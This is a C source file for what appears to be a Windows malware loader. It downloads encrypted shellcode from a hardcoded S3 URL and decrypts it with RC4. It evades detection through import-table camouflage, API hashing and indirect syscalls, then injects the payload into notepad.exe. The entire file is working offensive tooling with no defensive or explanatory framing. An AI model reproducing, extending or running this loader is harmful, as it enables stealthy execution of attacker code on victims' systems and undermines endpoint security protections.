#include <windows.h>
#include <stdio.h>

#include "Structs.h"
#include "Common.h"
#include "IATCamo.h"
#include "Debug.h"

#define PAYLOAD L"https://i-dont-love-daniel.s3.eu-north-1.amazonaws.com/encrypted_shellcode.bin"
#define PROC L"notepad.exe"

extern API_HASHING g_Api;

float _fltused = 0;

#define DEBUG



unsigned char ProtectedKey[] = {
        0x54, 0xDB, 0x46, 0xF6, 0x01, 0xD1, 0x9D, 0x55, 0x5A, 0x84, 0x5A, 0xEA, 0x87, 0xFD, 0x74, 0xF1 };

int main() {

    PBYTE pBytes = 0;
    SIZE_T sBytesSize = 0;
    DWORD PID = 0;
    HANDLE hProcess = NULL;
    HMODULE hNTDLL = NULL;

    IatCamouflage();

    PRINTA("getting payload from url...\n")
    if (!GetPayloadFromUrl(PAYLOAD, &pBytes, &sBytesSize)) {
        return -1;
    }


    PRINTA("Decrypting...\n");
    if (!Rc4EncryptionViSystemFunc032(ProtectedKey, pBytes, KEY_SIZE, sBytesSize)) {
        return NULL;
    }
    PRINTA("DONE!!\n");


    PRINTA("Starting Get Module...\n\n");
    hNTDLL = GetMod(NTDLLDLL_DJB2);
    g_Api.pOpenProcess = (fnOpenProcess)GetProcAddressH(GetModuleHandleH(KERNEL32DLL_JOAA), OpenProcess_JOAA);
    indirectMyAss(NtAllocateVirtualMemory_DJB2, hNTDLL, &NtAllocateVirtualMemorySSN, &NtAllocateVirtualMemorySyscall);
    indirectMyAss(NtCreateThreadEx_DJB2, hNTDLL, &NtCreateThreadSSN, &NtCreateThreadSyscall);
    indirectMyAss(NtWriteVirtualMemory_DJB2, hNTDLL, &NtWriteVirtualMemorySSN, &NtWriteVirtualMemorySyscall);
    indirectMyAss(NtWaitForSingleObject_DJB2, hNTDLL, &NtWaitForSingleObjectSSN, &NtWaitForSingleObjectSyscall);
    indirectMyAss(NtClose_DJB2, hNTDLL, &NtCloseSSN, &NtCloseSyscall);
    indirectMyAss(NtOpenProcess_DJB2, hNTDLL, &NtOpenProcessSSN, &NtOpenProcessSyscall);
    indirectMyAss(NtQuerySystemInformation_DJB2, hNTDLL, &NtQuerySystemInformationSSN, &NtQuerySystemInformationSyscall);


    PRINTA("running GetRemoteProcessHandle...\n\n");
    if (!GetRemoteProcessHandle(PROC, &PID, &hProcess)) {
        return -1;
    }



    if (!injectMyAss(hProcess, PID, pBytes, sBytesSize)) {
        return -1;
    }


    return 0;
}